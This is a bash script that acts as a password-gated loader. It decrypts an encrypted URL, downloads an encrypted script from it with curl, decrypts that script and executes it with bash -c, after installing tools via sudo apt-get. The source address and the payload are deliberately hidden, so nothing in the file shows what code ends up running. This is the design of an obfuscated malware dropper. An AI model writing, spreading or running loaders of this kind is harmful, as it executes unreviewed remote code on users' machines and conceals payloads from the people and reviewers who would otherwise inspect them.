#!/bin/bash

check_dependencies() {
    local dependencies=("base64" "openssl" "curl" "gawk")
    for dep in "${dependencies[@]}"; do

        if ! command -v "$dep" &> /dev/null; then
            echo "$dep is not installed. Installing..."
            if command -v apt-get &> /dev/null; then
                sudo apt-get update && sudo apt-get install -y "$dep"
            else
                echo "This script supports only systems using 'apt' package manager. Please install $dep manually."
                exit 1
            fi
        else
            :
        fi
    done
}
check_dependencies

decrypt_text() {   
    echo -n "$1" | base64 -d | openssl enc -d -aes-256-cbc -a -pbkdf2 -k "$password" | sed -e 's/SEKWSPACE/ /g' -e 's/SEKWTAB/\\t/g' -e 's/SEKWNEWLINE/\\n/g' -e 's/SEKWQUOTE/"/g' -e 's/SEKWDOLLAR/\$/g' -e 's/SEKWAMP/\&/g' -e 's/SEKWQUESTION/?/g' -e 's/SEKWEXCL/!/g' -e 's/SEKWPERCENT/%/g' -e 's/SEKWPLUS/+/g' -e 's/SEKWEQUAL/=/g' -e 's/SEKWDOT/\\./g' -e 's/SEKWCOMMA/,/g' -e 's/SEKWMINUS/-/g' -e 's/SEKWPIPE/|/g' -e 's/SEKWSLASH/\//g' -e 's/SEKWESC1XX/\\\\033/g' -e 's/SEKWESC2XX/\\\\x1B/g' -e 's/SEKWESC3XX/\\\\e/g' | awk '{gsub(/SEKWBACK/, "\\\\"); print}'
}

clear_sensitive_data() {
    unset password
    unset decrypted_url
    unset script_url
}

echo "Enter password:"
read -s password
        
decrypted_url=$(decrypt_text "VTJGc2RHVmtYMTlwK1YrZUZVZ0VSTCtxdmxaZmdyWjBPM3NYd0U4U3VQeERJaitHcXhIdjFOYWpqNjY2VGY0cQpZVzdZNmxUQ2JlalVnUytaejVGc3hHQnZoL3FueFZsZEJlcUtLQ0lTSkRjSDNiWnFWL2FKRVkzQ25kd241RkIyClBkb09VMjM3ell4bi93OXVUb3ArUWFpUHVVandvbUIwZXc2RlJHSUFjN1B1UkNwVXVIQVZqd3dEemJyTW5ud1kK")
script_url=$(echo -n "$decrypted_url")
encrypted_script=$(curl -sL "$script_url")
decrypted_script=$(decrypt_text "$encrypted_script")

if [[ -n "$decrypted_script" ]]; then
    bash -c "$decrypted_script"
    clear_sensitive_data
else
    echo "Wrong password"
    clear_sensitive_data
    sleep 3
fi
